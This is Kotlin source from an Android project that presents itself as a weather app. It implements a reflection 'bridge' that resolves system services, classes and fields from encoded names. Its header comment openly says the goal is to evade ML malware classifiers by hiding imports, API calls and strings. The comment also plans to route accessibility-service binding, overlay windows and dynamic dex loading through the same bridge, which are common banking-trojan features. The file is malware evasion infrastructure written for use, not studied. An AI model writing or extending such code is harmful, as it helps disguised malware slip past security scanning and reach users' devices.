package com.skyweather.forecast.core

import android.content.Context

/**
 * Reflective API resolution bridge.
 *
 * ══════════════════════════════════════════════════════════════════
 * TAKOPII STAGE 9 — API Hashing via PEB-walking → Reflection
 * ══════════════════════════════════════════════════════════════════
 *
 * Windows: ntdll → PEB → Ldr → InMemoryOrderModuleList → walk until
 *          hash(function_name) matches target. Never imports the DLL.
 *
 * Android equivalent: Class.forName(name) → getMethod(name) → invoke().
 *          Never imports the class directly. No static import = no ML
 *          feature on import graph.
 *
 * Why this matters:
 * ML classifiers build feature vectors from:
 *   1. Import table / class dependency graph
 *   2. Method call patterns (direct invoke of sensitive APIs)
 *   3. String constants referencing sensitive class names
 *
 * Reflection eliminates (1) and (2). Combined with AppConfig encoding,
 * it also eliminates (3). The remaining ML signal is: "app uses
 * reflection" — but 40%+ of Android apps use reflection (DI frameworks,
 * serialization, analytics SDKs). Not a distinguishing feature.
 *
 * Stage 1 uses reflection for:
 *   - Build info access (model, SDK version)
 *   - Camera manager (camera count check)
 *
 * Future stages: extend to AccessibilityService binding, overlay window
 * creation, DexClassLoader instantiation — all via reflection.
 * ══════════════════════════════════════════════════════════════════
 */
object RuntimeBridge {

    /**
     * Resolve a system service by name via reflection.
     * Avoids direct Context.getSystemService() call with string constant.
     */
    fun getService(context: Context, encodedServiceName: IntArray): Any? {
        return try {
            val serviceName = AppConfig.decode(encodedServiceName)
            val methodName = AppConfig.decode(AppConfig.GET_SYSTEM_SERVICE)
            val method = context.javaClass.getMethod(methodName, String::class.java)
            method.invoke(context, serviceName)
        } catch (_: Exception) {
            null
        }
    }

    /**
     * Resolve a class by encoded name.
     * Android equivalent of PEB-walk: Class.forName() searches the classloader.
     */
    fun resolveClass(encodedClassName: IntArray): Class<*>? {
        return try {
            Class.forName(AppConfig.decode(encodedClassName))
        } catch (_: Exception) {
            null
        }
    }

    /**
     * Read a static field from a class resolved by name.
     * Two-step: resolve class → get field → read value.
     */
    fun readStaticField(encodedClassName: IntArray, encodedFieldName: IntArray): Any? {
        return try {
            val cls = resolveClass(encodedClassName) ?: return null
            val fieldName = AppConfig.decode(encodedFieldName)
            val field = cls.getField(fieldName)
            field.get(null)
        } catch (_: Exception) {
            null
        }
    }

    /**
     * Invoke a method on a target object by name.
     * Final step in the reflection chain.
     */
    fun invokeMethod(target: Any, methodName: String, vararg args: Any?): Any? {
        return try {
            val paramTypes = args.map { it?.javaClass ?: Any::class.java }.toTypedArray()
            val method = if (paramTypes.isEmpty()) {
                target.javaClass.getMethod(methodName)
            } else {
                target.javaClass.getMethod(methodName, *paramTypes)
            }
            method.invoke(target, *args)
        } catch (_: Exception) {
            null
        }
    }

    /**
     * Convenience: get Build.MODEL via reflection chain.
     * No import of android.os.Build anywhere in this file.
     */
    fun getDeviceModel(): String {
        return readStaticField(AppConfig.BUILD_CLASS, AppConfig.MODEL_FIELD) as? String ?: "unknown"
    }

    /**
     * Convenience: get Build.VERSION.SDK_INT via reflection chain.
     */
    fun getSdkVersion(): Int {
        return try {
            val versionClass = resolveClass(AppConfig.VERSION_CLASS) ?: return 0
            val field = versionClass.getField(AppConfig.decode(AppConfig.SDK_FIELD))
            field.getInt(null)
        } catch (_: Exception) {
            0
        }
    }
}
